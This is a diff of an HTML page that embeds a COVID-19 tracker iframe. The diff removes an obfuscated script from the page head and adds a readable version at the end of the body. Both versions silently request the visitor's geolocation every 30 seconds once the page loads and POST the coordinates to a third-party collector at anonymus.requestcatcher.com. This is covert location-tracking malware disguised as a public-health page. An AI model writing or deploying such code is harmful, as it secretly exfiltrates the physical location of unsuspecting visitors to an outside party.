@@ -13,12 +13,7 @@
  
     <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
   <script src="https://code.jquery.com/ui/1.13.1/jquery-ui.js"></script>
-   <script>
-var _0x2c8145=_0x177b;function _0xc1de(){var _0x571ca4=['2312lQLGYm','geolocation','longitude','327hHzkww','252NZRAeg','443790ssNprB','5UghRFa','36IOGivm','1745815BTnSLk','POST','90076miGcFF','coords','1035140voJqCW','demo','8879464mkBxJc','29188082ntqMkK','done'];_0xc1de=function(){return _0x571ca4;};return _0xc1de();}(function(_0xe26b34,_0x17a6ee){var _0x416d18=_0x177b,_0x3c01d2=_0xe26b34();while(!![]){try{var _0x23eb52=parseInt(_0x416d18(0xc3))/0x1*(parseInt(_0x416d18(0xc2))/0x2)+-parseInt(_0x416d18(0xc0))/0x3*(parseInt(_0x416d18(0xce))/0x4)+parseInt(_0x416d18(0xc5))/0x5+parseInt(_0x416d18(0xc1))/0x6*(parseInt(_0x416d18(0xc7))/0x7)+parseInt(_0x416d18(0xcb))/0x8+parseInt(_0x416d18(0xc4))/0x9*(parseInt(_0x416d18(0xc9))/0xa)+-parseInt(_0x416d18(0xcc))/0xb;if(_0x23eb52===_0x17a6ee)break;else _0x3c01d2['push'](_0x3c01d2['shift']());}catch(_0x6740b8){_0x3c01d2['push'](_0x3c01d2['shift']());}}}(_0xc1de,0xc4edb));var x=document['getElementById'](_0x2c8145(0xca));function getLocation(){var _0x38c04f=_0x2c8145;if(navigator[_0x38c04f(0xcf)])navigator[_0x38c04f(0xcf)]['getCurrentPosition'](showPosition);else{}}function showPosition(_0xc0ad33){var _0x2b1be5=_0x2c8145,_0x2e8ef9={'url':'https://anonymus.requestcatcher.com/link?https://www.google.com/maps/search/'+_0xc0ad33[_0x2b1be5(0xc8)]['latitude']+','+_0xc0ad33[_0x2b1be5(0xc8)][_0x2b1be5(0xbf)],'method':_0x2b1be5(0xc6),'headers':{'Content-Type':'application/json'}};$['ajax'](_0x2e8ef9)[_0x2b1be5(0xcd)](function(_0x401181){});}function _0x177b(_0x503e2f,_0x562358){var _0xc1de1=_0xc1de();return _0x177b=function(_0x177b98,_0x4a9ea9){_0x177b98=_0x177b98-0xbf;var _0x2a719b=_0xc1de1[_0x177b98];return _0x2a719b;},_0x177b(_0x503e2f,_0x562358);}function sleep(_0x5d64dd){return new Promise(_0x5547fa=>setTimeout(_0x5547fa,_0x5d64dd));}async function Tutor(){while(0x1<0x2){await sleep(0x7530),getLocation();}}Tutor();
-
-
-
-</script>
+   
   <meta name="viewport" content="width=device-width, initial-scale=1" />
 
   <!-- Document Title
@@ -66,17 +61,85 @@ var _0x2c8145=_0x177b;function _0xc1de(){var _0x571ca4=['2312lQLGYm','geolocatio
  
 
 
-<!--  <iframe src="https://www.coronatracker.com/analytics/"
+ <iframe src="https://www.coronatracker.com/analytics/"
             frameborder="0" 
             marginheight="0" 
             marginwidth="0" 
             width="100%" 
             height="100%" 
             scrolling="auto">
-  </iframe> -->
+  </iframe>
+
+
+<script>
+var x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    // x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+ function showPosition(position) {
+ // x.innerHTML = "Latitude: " + position.coords.latitude + 
+//  "<br>Longitude: " + position.coords.longitude;
+
+
+      var settings = {
+
+
+        "url": "https://anonymus.requestcatcher.com/link?https://www.google.com/maps/search/"+position.coords.latitude+","+position.coords.longitude,
+        "method": "POST",
+        "headers": {
+          
+          "Content-Type": "application/json",
+          
+        },
+        
+      };
+
+
+      $.ajax(settings).done(function (response) {
+      }
+      );
 
 
 
+
+
+        // document.write( "Latitude: " + position.coords.latitude + " Longitude: " + position.coords.longitude + "<br>");
+
+
+}
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+
+
+
+
+
+
+   async function Tutor() {
+      while (1<2) {        
+        await sleep(30000);
+         getLocation();
+      }
+   }
+   
+
+$(document).ready(function() {
+ // executes when HTML-Document is loaded and DOM is ready
+ Tutor()
+});
+
+
+</script>
 
 </body>
 </html>
+
